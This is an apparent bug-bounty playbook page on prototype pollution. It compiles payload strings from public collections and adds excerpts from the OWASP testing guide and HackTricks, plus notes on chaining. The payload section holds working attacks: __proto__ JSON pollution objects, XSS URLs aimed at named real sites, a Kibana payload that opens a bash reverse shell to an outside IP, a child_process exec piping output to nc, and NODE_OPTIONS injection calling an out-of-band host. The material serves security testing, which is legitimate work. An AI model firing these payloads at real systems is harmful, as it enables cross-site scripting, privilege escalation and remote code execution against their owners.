# Real-World Playbook — Prototype Pollution

**Class:** `prototype-pollution` · **Coverage-matrix tier:** 1 · **Hunter2:** /proto-pollution · tools/prototype_pollution_scanner.py · **Skill:** client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
var myDog = new Dog();
```
```
// Points to the function "Dog"
myDog.constructor;
```
```
// Points to the class definition of "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```
```
    let config = {
        isAdmin: false
    };
```
```
    Object.prototype.isAdmin = true;
```
```
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```
```
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```
```
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```
```
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```
```
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
```
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
```
```
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Prototype Pollution

|ID          |
|------------|
|WSTG-INJT-22|

#### Summary

JavaScript is a prototype-based language. Almost every object inherits from `Object.prototype`, and any property that is not found directly on an object is looked up through the prototype chain. Prototype pollution occurs when an application uses attacker-controlled input to set the *keys* of an object during a recursive merge, clone, or path-based assignment, allowing the attacker to reach `Object.prototype` through a special key such as `__proto__`, `constructor`, or `prototype`. Because that prototype is shared by every object in the runtime, the injected property silently becomes visible to unrelated parts of the application.

> Note: This is not the same as [HTTP Parameter Pollution](04-HTTP_Parameter_Pollution.md); despite the similar name, the two vulnerabilities are unrelated.

Pollution on its own rarely causes harm directly. Its impact depends on a *gadget*: existing code that later reads a property the attacker managed to plant and then uses it in a sensitive way. The same root cause appears in two contexts:

- **Server-side (Node.js)**: depending on the available gadget, impact ranges from denial of service and bypass of security logic to remote code execution. A well-known example is the Kibana RCE, [CVE-2019-7609](https://nvd.nist.gov/vuln/detail/CVE-2019-7609).
- **Client-side (browser)**: combined with a suitable gadget it commonly leads to DOM-based [Cross-Site Scripting](01-Reflected_Cross_Site_Scripting.md) and can be used to bypass client-side defenses.

#### Test Objectives

- Identify functions and libraries that recursively merge, clone, or assign user-controlled properties.
- Determine whether user input can reach and modify `Object.prototype`.
- Identify gadgets that turn prototype pollution into a concrete impact.

#### How to Test

The following example illustrates the root cause. A naive recursive merge copies every key of an attacker-controlled object into a target:

```javascript
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === "object" && typeof target[key] === "object") {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

If the source is parsed from user input such as `{"__proto__": {"polluted": "yes"}}`, the assignment walks into `__proto__` and writes onto `Object.prototype`. Afterwards every object in the runtime inherits the planted property:

```javascript
merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
({}).polluted;   // "yes"  -> Object.prototype was polluted
```

##### Black-Box Testing

###### Identify the Sources

Prototype pollution is reachable through any input whose keys end up as object property names. Review the application for:

- URL query string and the URL fragment (hash), using bracket or dotted notation, e.g. `?__proto__[key]=value` or `?__proto__.key=value`.
- JSON request bodies that are deserialized and then merged or cloned (configuration, profile, or settings endpoints are common candidates).
- Other structured inputs parsed into nested objects, such as form data or cookies.

###### Client-Side Prototype Pollution

Submit a probe that attempts to set a uniquely-named property on the prototype through a candidate source. The two encodings below express the same intent:

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Class Pollution (Python's Prototype Pollution)


#### Basic Example

Changing `__qualname__` through an instance's class reference updates the class and its mutable base classes.<sup>[[1]](#references)</sup>

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Client PP + gadget → DOM XSS
- Server PP (__proto__ in JSON) → privesc / RCE gadget / DoS

## Hunter2 wiring
- **Run:** `/proto-pollution · tools/prototype_pollution_scanner.py`
- **Skill:** `client-side-security`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
